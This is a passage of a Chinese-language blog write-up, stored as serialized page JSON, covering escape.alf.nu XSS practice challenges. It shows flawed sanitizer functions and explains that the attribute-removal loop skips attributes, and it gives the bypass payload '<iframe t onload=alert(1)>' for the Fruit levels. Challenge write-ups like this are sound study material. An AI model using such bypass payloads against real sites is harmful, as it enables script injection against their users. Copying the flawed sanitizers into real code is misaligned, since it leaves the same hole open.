n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],"[i].",["$","span",null,{"className":"hljs-property","children":"name"}],";\n      ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (name !== ",["$","span",null,{"className":"hljs-string","children":"'class'"}],") { n.",["$","span",null,{"className":"hljs-title function_","children":"removeAttribute"}],"(name); }\n    }\n  }\n  [].",["$","span",null,{"className":"hljs-property","children":"map"}],".",["$","span",null,{"className":"hljs-title function_","children":"call"}],"(div.",["$","span",null,{"className":"hljs-title function_","children":"querySelectorAll"}],"(",["$","span",null,{"className":"hljs-string","children":"'*'"}],"), f);\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":["这个题目的漏洞来源于代码的逻辑不严谨。\n关键在于第6行中的",["$","code",null,{"children":"i<n.attributes.length"}],"，但是这个length是动态变化的，导致如果有多个属性的时候，就还剩下一个属性是删不掉了。\n这样的话我们就构造多个属性好了，将",["$","code",null,{"children":"onload=alert(1)"}],"放后面。\nsolution(26): ",["$","code",null,{"children":"<iframe t onload=alert(1)>"}]]}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"fruit-2","children":"Fruit 2"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," div = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-property","children":"implementation"}],".",["$","span",null,{"className":"hljs-title function_","children":"createHTMLDocument"}],"().",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'div'"}],");\n  div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}]," = s;\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"f"}],"(",["$","span",null,{"className":"hljs-params","children":"n"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (",["$","span",null,{"className":"hljs-regexp","children":"/script/i"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(n.",["$","span",null,{"className":"hljs-property","children":"tagName"}],")) n.",["$","span",null,{"className":"hljs-property","children":"parentNode"}],".",["$","span",null,{"className":"hljs-title function_","children":"removeChild"}],"(n);\n    ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," (",["$","span",null,{"className":"hljs-keyword","children":"var"}]," i=",["$","span",null,{"className":"hljs-number","children":"0"}],"; i<n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],".",["$","span",null,{"className":"hljs-property","children":"length"}],"; i++) {\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," name = n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],"[i].",["$","span",null,{"className":"hljs-property","children":"name"}],";\n      ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (name !== ",["$","span",null,{"className":"hljs-string","children":"'class'"}],") { n.",["$","span",null,{"className":"hljs-title function_","children":"removeAttribute"}],"(name); }\n    }\n  }\n  [].",["$","span",null,{"className":"hljs-property","children":"map"}],".",["$","span",null,{"className":"hljs-title function_","children":"call"}],"(div.",["$","span",null,{"className":"hljs-title function_","children":"querySelectorAll"}],"(",["$","span",null,{"className":"hljs-string","children":"'*'"}],"), f);\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":"这一题改变了第五行的if语句，看不出来会带来什么不同的影响。\n至少对于我上一题的解法没影响，所以用同样的方法就可以。"}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"fruit-3","children":"Fruit 3"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n  ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," div = ",["$","span",null,{"className":"hljs-variable language_","children":"document"}],".",["$","span",null,{"className":"hljs-property","children":"implementation"}],".",["$","span",null,{"className":"hljs-title function_","children":"createHTMLDocument"}],"().",["$","span",null,{"className":"hljs-title function_","children":"createElement"}],"(",["$","span",null,{"className":"hljs-string","children":"'div'"}],");\n  div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}]," = s;\n  ",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"f"}],"(",["$","span",null,{"className":"hljs-params","children":"n"}],") {\n    ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (",["$","span",null,{"className":"hljs-regexp","children":"/script/i"}],".",["$","span",null,{"className":"hljs-title function_","children":"test"}],"(n.",["$","span",null,{"className":"hljs-property","children":"tagName"}],")) n.",["$","span",null,{"className":"hljs-property","children":"parentNode"}],".",["$","span",null,{"className":"hljs-title function_","children":"removeChild"}],"(n);\n    ",["$","span",null,{"className":"hljs-keyword","children":"for"}]," (",["$","span",null,{"className":"hljs-keyword","children":"var"}]," i=",["$","span",null,{"className":"hljs-number","children":"0"}],"; i<n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],".",["$","span",null,{"className":"hljs-property","children":"length"}],"; i++) {\n      ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," name = n.",["$","span",null,{"className":"hljs-property","children":"attributes"}],"[i].",["$","span",null,{"className":"hljs-property","children":"name"}],";\n      ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (name !== ",["$","span",null,{"className":"hljs-string","children":"'class'"}],") { n.",["$","span",null,{"className":"hljs-title function_","children":"removeAttribute"}],"(name); i--; }\n    }\n  }\n  [].",["$","span",null,{"className":"hljs-property","children":"map"}],".",["$","span",null,{"className":"hljs-title function_","children":"call"}],"(div.",["$","span",null,{"className":"hljs-title function_","children":"querySelectorAll"}],"(",["$","span",null,{"className":"hljs-string","children":"'*'"}],"), f);\n  ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," div.",["$","span",null,{"className":"hljs-property","children":"innerHTML"}],";\n}\n"]}]}],"\n",["$","p",null,{"children":"不会。"}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","h1",null,{"id":"quine","children":"Quine"}],"\n",["$","pre",null,{"children":["$","code",null,{"className":"hljs language-js","children":[["$","span",null,{"className":"hljs-comment","children":"// submitted by Somebody"}],"\n",["$","span",null,{"className":"hljs-keyword","children":"function"}]," ",["$","span",null,{"className":"hljs-title function_","children":"escape"}],"(",["$","span",null,{"className":"hljs-params","children":"s"}],") {\n    ",["$","span",null,{"className":"hljs-comment","children":"// We've got a quine level in all of the other"}],"\n    ",["$","span",null,{"className":"hljs-comment","children":"// games, so why not have one here?"}],"\n    ",["$","span",null,{"className":"hljs-keyword","children":"var"}]," win = alert;\n    ",["$","span",null,{"className":"hljs-variable language_","children":"window"}],".",["$","span",null,{"className":"hljs-property","children":"alert"}]," = ",["$","span",null,{"className":"hljs-keyword","children":"function"}],"(",["$","span",null,{"className":"hljs-params","children":"t"}],") {\n        ",["$","span",null,{"className":"hljs-keyword","children":"if"}]," (t === s)\n            ",["$","span",null,{"className":"hljs-title function_","children":"win"}],"(",["$","span",null,{"className":"hljs-number","children":"1"}],");\n        ",["$","span",null,{"className":"hljs-keyword","children":"else"}],"\n            ",["$","span",null,{"className":"hljs-variable language_","children":"console"}],".",["$","span",null,{"className":"hljs-title function_","children":"log"}],"(",["$","span",null,{"className":"hljs-string","children":"\"Alert: \""}]," + t + ",["$","span",null,{"className":"hljs-string","children":"\"\\n(That's not a quine)\""}],");\n    }\n    ",["$","span",null,{"className":"hljs-keyword","children":"return"}]," s;\n}\n"]}]}],"\n",["$","p",null,{"children":"这题很有意思。可惜我不会啊。"}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","br",null,{}],"\n",["$","p",null,{"children":["参考",["$","a",null,{"href":"http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/","children":"博客-上"}]]}],"\n",["$","p",null,{"children":["参考",["$","a",null,{"href":"http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/","children":"博客-下"}]]}]]}]]}]]
